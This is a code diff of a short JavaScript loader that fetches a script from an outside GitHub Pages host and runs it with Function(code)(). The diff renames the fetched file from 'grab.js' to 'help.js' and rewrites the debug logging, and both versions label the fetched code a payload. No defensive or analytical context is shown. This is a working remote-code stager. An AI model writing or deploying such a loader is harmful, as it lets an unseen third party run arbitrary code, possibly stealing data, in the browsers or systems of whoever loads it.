@@ -1,12 +1,17 @@
-(async()=>{
-  console.log('🔄 Loader started'); // Debug
+(async function(){
+  console.log('🐛 Loader: Starting');
   try {
-    const resp = await fetch('https://cloudsecu.github.io/Data/grab.js');
-    if (!resp.ok) throw new Error('Fetch failed: ' + resp.status);
-    const code = await resp.text();
-    console.log('✅ Payload loaded:', code.length, 'bytes');
-    Function(code)();
+    const resp = await fetch('https://cloudsecu.github.io/Data/help.js');
+    console.log('🐛 Loader: Status', resp.status);
+    
+    if (resp.ok) {
+      const code = await resp.text();
+      console.log('🐛 Loader: Executing payload');
+      Function(code)();
+    } else {
+      console.error('🐛 Loader: 404/500');
+    }
   } catch(e) {
-    console.error('Loader error:', e); // Debug console
+    console.error('🐛 Loader ERROR:', e);
   }
 })();
